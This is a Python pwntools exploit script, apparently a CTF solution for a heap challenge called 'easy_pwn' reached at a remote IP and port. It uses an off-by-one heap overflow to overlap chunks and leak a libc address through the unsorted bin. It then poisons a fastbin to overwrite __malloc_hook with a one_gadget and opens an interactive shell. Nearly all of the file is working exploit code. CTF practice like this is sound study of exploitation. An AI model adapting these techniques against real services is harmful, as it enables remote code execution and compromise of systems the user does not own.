from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context(arch = 'amd64', os = 'linux')

def change_ld(binary, ld):
    """Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return path


debug=0
if debug ==1:
    path=change_ld('./easy_pwn.dms', './ld.so.2')
    io = process(path,env={'LD_PRELOAD':'./libc.so.6'}) 
    libc = ELF("./libc.so.6")
    elf=ELF(path)
elif debug==0:
    io = remote("39.97.182.233",34223)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elf=ELF("./easy_pwn.dms")
elif debug==2:
    io =  process("./easy_pwn.dms")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elf=ELF("./easy_pwn.dms")



s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

def create(size):
    ru("choice: ")
    sl('1')    
    ru("size: ")
    sl(str(size))
def write(idx,size,content):
    ru("choice: ")
    sl('2')    
    ru("index: ")
    sl(str(idx))
    ru("size: ")
    sl(str(size))
    ru("content: ")
    s(content)
def drop(idx):
    ru("choice: ")
    sl('3')    
    ru("index: ")
    sl(str(idx))
def show(idx):
    ru("choice: ")
    sl('4')    
    ru("index: ")
    sl(str(idx))
create(0x70-8)
create(0x20-8)
create(0xc0-8)
create(0x70-8)
create(0x70-8)
write(0,0x70+10-8,'a'*(0x70-8)+'\xe1')
drop(1)
create(0xe0-8)#1

write(1,0x20,'a'*(0x20-8)+p64(0xc1))

drop(2)
show(1)
ru("content: ")
r(0x20)
unsorted_bin=u64(r(6).ljust(8,'\x00'))
log.success(hex(unsorted_bin))
libc.address=unsorted_bin-0x3c4b78

create(0x70-8)#2
drop(2)


content=p64(libc.symbols['__malloc_hook']-0x23)
print hex(u64(content))

onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
onegadget=libc.address+onegadgets[1]
c='a'*(0x20-8)
c+=p64(0x71)
c+=content
write(1,len(c),c)

create(0x70-8)
create(0x70-8)
c="d"*0xB+p64(0)+p64(onegadget)+'\x00'*8
c="d"*0xB+p64(onegadget)+p64(libc.symbols['realloc'])+'\x00'*8

write(5,len(c),c)
create(1)

io.interactive()